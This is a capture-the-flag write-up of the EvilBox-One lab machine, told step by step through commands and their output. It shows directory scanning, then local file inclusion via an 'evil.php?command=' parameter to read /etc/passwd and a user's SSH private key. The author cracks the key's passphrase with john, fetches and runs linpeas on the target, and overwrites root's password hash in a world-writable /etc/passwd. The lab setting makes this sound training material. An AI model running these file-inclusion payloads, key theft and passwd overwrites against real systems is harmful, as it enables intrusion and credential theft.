
## EvilBox-One

initial scan 

```shell
sudo nmap -sC -sV -n -p- -T5 -oA scan 192.168.141.212
```

Found an open webserver and ssh server

```shell
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 4495500be473a18511ca10ec1ccbd426 (RSA)
|   256 27db6ac73a9c5a0e47ba8d81ebd6d63c (ECDSA)
|_  256 e30756a92563d4ce3901c19ad9fede64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Now i'm gonna try to discover directories on the server. 

```shell
feroxbuster --url http://192.168.141.212/
```
We found a few directories 

```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.141.212/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      368l      933w    10701c http://192.168.141.212/
301      GET        9l       28w      319c http://192.168.141.212/secret => http://192.168.141.212/secret/
403      GET        9l       28w      280c http://192.168.141.212/server-status
[########>-----------] - 37s    26052/60000   49s     found:3       errors:53     
[#########>----------] - 37s    13697/30000   369/s   http://192.168.141.212/ 
[########>-----------] - 28s    12351/30000   430/s   http://192.168.141.212/secret 
```

What's in the /secret directory? 
```shell
curl http://192.168.141.212/secret/               




                                   
```
nothing! 
maybe starting from that directory? Looking for php files? 


```shell
gobuster dir -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.141.212/secret -t 60 -x php
```

We found evil.php
```shell
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.141.212/secret
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/11/21 16:00:21 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/evil.php             (Status: 200) [Size: 0]
Progress: 51789 / 441122 (11.74%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/11/21 16:01:45 Finished
===============================================================
```

We can't just view server side php files because they're executed by the server when visited. Lets try to fuzz to check for file inclusion? 

```shell
ffuf -c -r -u 'http://192.168.141.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/wfuzz/general/common.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.141.212/secret/evil.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 89ms]
:: Progress: [951/951] :: Job [1/1] :: 465 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
Looks like 'command=' lets us do LFI, lets checkout the passwd file

```shell
curl http://192.168.141.212/secret/evil.php?command=/etc/passwd
```
now we can see the users

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```
Lets try to access the ssh directory of user 'mowree'

```shell
curl http://192.168.141.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
```
and save it in our dir
```shell
 curl http://192.168.141.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa >> id_rsa.key
```
Looks like the key is encrypted, we can use John to crack it

```shell
ssh2john id_rsa.key >> id_rsa.john
```
The default john wordlist is probably enough.
```shell
┌──(kali㉿kali)-[~/evilbox1]
└─$ john id_rsa.john
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
unicorn          (id_rsa.key) 
```
we got the passphrase! 
now we have to change the keys perms to be usable 
```shell
sudo chmod 600 id_rsa.key
```
```
┌──(kali㉿kali)-[~/evilbox1]
└─$ ssh -i id_rsa.key mowree@192.168.141.212
Enter passphrase for key 'id_rsa.key': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ 
```
We're in! 

```shell
cat local.txt
```

We have to gain some more privs now

Lets run linpeas.sh

on my local box

```shell
──(kali㉿kali)-[~]
└─$ curl https://linpeas.sh/ >> peas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  753k    0  753k    0     0  1214k      0 --:--:-- --:--:-- --:--:-- 1215k
                                                                                
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ python3 -m 'http.server'
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
on the remote machine

```shell
wget http://192.168.49.141:8000/peas.sh

bash peas.sh
```
Looks like /etc/passwds in writable by everyone

```shell
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/passwd
/home/mowree
/run/lock
/run/user/1000
/run/user/1000/systemd
/tmp
```
We can edit the root users password and privesc! 

openssl will let us create a usable MD5 hash 

```shell
mowree@EvilBoxOne:~$ openssl passwd
Password:<NEW PASS> 
Verifying - Password: 
JYJdgYzK7tpEM
```
Stick that hash in the 'x' listed after root:

```shell

nano /etc/passwd

root:JYJdgYzK7tpEM:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```

lets check if it worked
```shell
su root
Password:
root@EvilBoxOne:/home/mowree# whoami
root
root@EvilBoxOne:/home/mowree# 
```
Ay! it worked! we can finally grab the last flag and submit it. 

```shell
cat /root/proof.txt
```

Fun box! I learned a lot in this box, namely fuzzing for LFI. I've never used ffuf before so it's good to add that to the toolbox. 
